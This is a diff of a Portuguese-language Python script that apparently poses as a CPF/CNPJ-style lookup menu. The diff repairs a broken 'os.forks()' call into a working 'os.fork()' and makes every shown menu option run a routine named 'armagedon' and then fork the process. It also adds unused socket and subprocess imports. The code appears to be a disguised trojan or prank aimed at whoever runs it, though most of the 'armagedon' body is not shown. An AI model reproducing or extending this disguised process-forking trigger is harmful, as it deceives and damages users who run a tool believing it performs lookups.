@@ -1,8 +1,12 @@
 import os
 from time import sleep
+import socket
+import sys
+import subprocess
+
 
 def b():
-    os.forks()
+    os.fork()
 
 
 def clear():
@@ -43,7 +47,7 @@ def armagedon():
         contador += 1
 
 
-b()
+
 
 
 def condicoes():
@@ -54,26 +58,31 @@ def condicoes():
         sleep(1)
         clear()
         armagedon()
+        b()
     elif op == 2:
         input('número > ')
         sleep(1)
         clear()
         armagedon()
+        b()
     elif op == 3:
         print('Eu avisei que estava off!')
         sleep(1)
         clear()
         armagedon()
+        b()
     elif op == 4:
         print('Eu avisei que estava off!')
         sleep(1)
         clear()
         armagedon()
+        b()
     elif op == 5:
         input('cnpj > ')
         sleep(1)
         clear()
         armagedon()
+        b()
     elif op == 6:
         print('macasi ou @cauabeisola (insta)')
         sleep(3)
